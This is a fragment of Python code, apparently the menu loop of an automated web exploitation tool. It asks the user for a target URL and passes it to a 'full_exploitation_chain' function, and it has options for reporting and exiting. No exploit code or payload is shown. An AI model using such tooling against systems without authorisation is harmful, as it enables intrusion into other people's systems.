                    target_url = input(Fore.GREEN + "Enter target URL for Full Exploitation Chain: " + Style.RESET_ALL)
                    full_exploitation_chain(target_url)
                elif exploit_choice == "8":
                    break
                else:
                    print(Fore.RED + "Invalid choice. Please try again." + Style.RESET_ALL)

        elif choice == "4":  # Full Exploitation Chain Automation
            target_url = input(Fore.GREEN + "Enter target URL for Full Exploitation Chain: " + Style.RESET_ALL)
            full_exploitation_chain(target_url)

        elif choice == "5":  # Reporting
            generate_report(results)

        elif choice == "6":  # Exit
            print(Fore.CYAN + "Exiting... Goodbye!" + Style.RESET_ALL)
            break

        else:
            print(Fore.RED + "Invalid choice. Please try again." + Style.RESET_ALL)
